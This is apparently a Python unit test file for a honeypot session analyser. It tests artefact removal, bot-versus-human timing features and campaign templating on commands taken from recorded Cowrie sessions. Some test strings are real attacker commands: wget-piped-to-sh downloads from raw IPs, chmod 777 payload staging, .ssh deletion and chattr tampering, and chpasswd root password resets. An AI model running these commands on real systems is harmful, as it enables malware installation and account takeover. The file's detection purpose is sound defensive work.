"""test_fv2.py - unit tests for fv2 on sequences copied from the COW160 inspection."""
import math, os, struct, sys, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fv2

os.chdir(tempfile.mkdtemp(prefix="test_fv2_"))      # scratch files never touch the project

def ok(cond, msg):
    print(("PASS " if cond else "FAIL ") + msg)
    if not cond:
        ok.failed += 1
ok.failed = 0

# 1) one-line system-info script (71dc): 1 top line + 8 substitution events ~1 ms apart
top = ("uname=$(uname -s -v -n 2>/dev/null);; arch=$(uname -m 2>/dev/null);; "
       "uptime=$(awk '{u=int($1);d=int(u/86400)}' /proc/uptime);; "
       "secs=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1);; x=$((secondsStr % 60))")
der = ["uname -s -v -n 2 > /dev/null", "uname -m 2 > /dev/null", "awk {u=int($1",
       "cat /proc/uptime | cut -d  -f1 | cut -d. -f1", "(secondsStr"]
ev = [(100.0, top)] + [(100.0 + 0.001 * (i + 1), d) for i, d in enumerate(der)]
lines, derived, empty = fv2.input_lines(ev)
ok(len(lines) == 1 and derived == 5, f"71dc-like collapses to 1 line ({len(lines)} lines, {derived} derived)")
ok(fv2.json_prefix_features(lines, 99.9, 3) is None, "1-line session never reaches k=3")

# 2) Outlaw long variant (f2be): 'ls -lh $(which ls)' then artefact 'which ls' after 1 ms
f2 = ["cd ~; chattr -ia .ssh; lockr -ia .ssh", "cd ~ && rm -rf .ssh && mkdir .ssh && echo x",
      "cat /proc/cpuinfo | grep name | wc -l", "ls -lh $(which ls)", "which ls", "crontab -l"]
gaps = [0.591, 13.294, 7.222, 0.596, 0.001]
t, ev = 50.0, []
for c, g in zip(f2, [0.0] + gaps):
    t += g
    ev.append((t, c))
lines, derived, _ = fv2.input_lines(ev)
ok(len(lines) == 5 and derived == 1, f"f2be-like: 'which ls' artefact removed ({len(lines)} lines)")

# 3) a real human command that only LOOKS like the previous line is kept (gap > 1 s)
ev = [(0.0, "ls -la /tmp"), (6.0, "ls")]
ok(len(fv2.input_lines(ev)[0]) == 2, "human 'ls' after 'ls -la /tmp' kept (no $( in line)")
ev = [(0.0, "echo $(whoami)"), (0.002, "whoami"), (5.0, "whoami")]
lines, derived, _ = fv2.input_lines(ev)
ok(len(lines) == 2 and derived == 1, "typed 'whoami' 5 s later is kept, artefact removed")

# 4) 0f07 slow Outlaw bot: 485-char line 1.21 s after the first -> implied rate 400 chars/s
l2 = "x" * 485
lines = [(10.0, "cd ~; chattr -ia .ssh; lockr -ia .ssh"), (11.21, l2), (16.0, "cat /proc/cpuinfo | grep name | wc -l")]
f = fv2.json_prefix_features(lines, 9.5, 3)
ok(abs(10 ** f["log_max_rate"] - 485 / 1.21) < 1e-6, f"0f07 max rate = {10 ** f['log_max_rate']:.1f} chars/s")
ok(abs(10 ** f["log_first_latency"] - 0.5) < 1e-9, "first latency 0.5 s")
ok(abs(f["gap_cv"] - (abs(1.21 - 4.79) / 2) / ((1.21 + 4.79) / 2)) < 1e-9, "gap CV of two gaps")

# 5) burst bot: all gaps 0 -> cv 0, rates use the 1 ms floor
lines = [(5.0, "id"), (5.0, "uname -a"), (5.0, "w")]
f = fv2.json_prefix_features(lines, 4.0, 3)
ok(f["gap_cv"] == 0.0 and abs(10 ** f["log_max_rate"] - 8 / 0.001) < 1e-6, "burst: cv 0, rate floor 1 ms")

# 6) TTY: human types 'ls' + Enter char by char with a backspace; bot sends whole lines
def write_tty(path, recs):
    with open(path, "wb") as fh:
        fh.write(struct.pack("<iLiiLL", 1, 0, 0, 0, 0, 0))
        for t, d, p in recs:
            sec, usec = int(t), int(round((t - int(t)) * 1e6))
            fh.write(struct.pack("<iLiiLL", 3, 0, len(p), d, sec, usec)); fh.write(p)
write_tty("h.tty", [(1.0, 1, b"l"), (1.2, 1, b"x"), (1.4, 1, b"\x7f"), (1.6, 1, b"s"),
                    (1.8, 1, b"\r"), (1.85, 2, b"file\r\n"), (5.0, 1, b"w"), (5.3, 1, b"\r")])
r = fv2.read_tty("h.tty")
tf = fv2.tty_prefix_features(r, 5.3, 2)
ok(tf["single_char_ratio"] == 1.0 and tf["edit_keys_per_line"] == 0.5, f"human TTY {tf}")
ok(abs(10 ** tf["log_key_gap_median"] - 0.2) < 1e-3, "human intra-line key gap 0.2 s")
tf = fv2.tty_prefix_features(r, 1.8, 1)
ok(tf["tty_input_writes"] == 5, "prefix cut drops keystrokes after the decision time")
write_tty("b.tty", [(1.0, 1, b"uname -a\r"), (1.3, 1, b"id\r"), (1.6, 1, b"w\r")])
tf = fv2.tty_prefix_features(fv2.read_tty("b.tty"), 1.6, 3)
ok(tf["single_char_ratio"] == 0.0 and tf["log_key_gap_median"] == -3.0, f"bot TTY {tf}")
write_tty("e.tty", [(1.0, 3, b"uname -a; id")])
r = fv2.read_tty("e.tty")
ok(fv2.tty_mode(r) == "exec" and math.isnan(fv2.tty_prefix_features(r, 2.0, 3)["single_char_ratio"]),
   "exec session: mode=exec, keystroke features missing (NaN), not 0")

# 7) TTY path status: pre-patch duplicate unusable, post-patch duplicate usable
os.makedirs("tty", exist_ok=True)
open("tty/abc", "wb").close(); open("tty/abc-20261011-2100-s2-0i", "wb").close()
ok(fv2.tty_path_status({"ttylog": "var/lib/cowrie/tty/abc", "duplicate": True}, "tty")[1] == "dedup_deleted",
   "pre-patch duplicate -> dedup_deleted")
ok(fv2.tty_path_status({"ttylog": "var/lib/cowrie/tty/abc", "duplicate": False}, "tty")[1] == "ok",
   "first owner -> ok")
ok(fv2.tty_path_status({"ttylog": "var/lib/cowrie/tty/abc-20261011-2100-s2-0i", "duplicate": True}, "tty")[1] == "ok",
   "post-patch duplicate -> ok")
# 8) campaign templates: random tokens, URLs, IPs and numbers become placeholders
ok(fv2.template_line("wget -qO - http://61.215.151.173/x/1sh | sh") == "wget -qO - <URL> | sh", "template: URL")
ok(fv2.template_line("echo root:Xk92mPq7|chpasswd") == "echo root:<TOK>|chpasswd", "template: random password")
ok(fv2.template_line("head -n 5 /etc/passwd") == "head -n <N> /etc/passwd", "template: number")
ok(fv2.template_line("/ip cloud print") == "/ip cloud print", "template: plain command unchanged")
a = [(0, "cd /tmp; wget 45.9.148.1:8080/a8f3k2j9; chmod 777 a8f3k2j9")]
b = [(0, "cd /tmp; wget 103.77.20.4:8080/zq71ma0x; chmod 777 zq71ma0x")]
ok(fv2.sequence_hash(a, template=True) == fv2.sequence_hash(b, template=True)
   and fv2.sequence_hash(a) != fv2.sequence_hash(b), "same campaign template, different exact sequence")

# 9) COW160 v2-v4 passwd prompt piped into bash is dropped; the same text elsewhere is kept
ev = [(0.0, 'echo -e "a\\nb\\nc"|passwd|bash'), (0.003, "Changing password for ubuntu.\nCurrent password:"),
      (0.7, 'echo "a\\nb\\nc\\n"|passwd'), (1.4, "uname -a")]
lines, arte, _ = fv2.input_lines(ev, detail=True)
ok(len(lines) == 3 and arte == {"substitution": 0, "passwd_echo": 1}, f"passwd|bash prompt dropped {arte}")
ev = [(0.0, "ls"), (0.003, "Changing password for ubuntu.")]
ok(len(fv2.input_lines(ev)[0]) == 2, "prompt text without a passwd|bash parent is kept")
ok(fv2.family_hash([(0, "cd /tmp; wget 45.9.148.1/x8a7b6c5d")]) ==
   fv2.family_hash([(0, "cd /tmp; wget 10.0.0.9/q1w2e3r4t5"), (1, "id")]), "family = first-line template")

print("ALL TESTS PASSED" if ok.failed == 0 else f"{ok.failed} TEST(S) FAILED")
sys.exit(1 if ok.failed else 0)
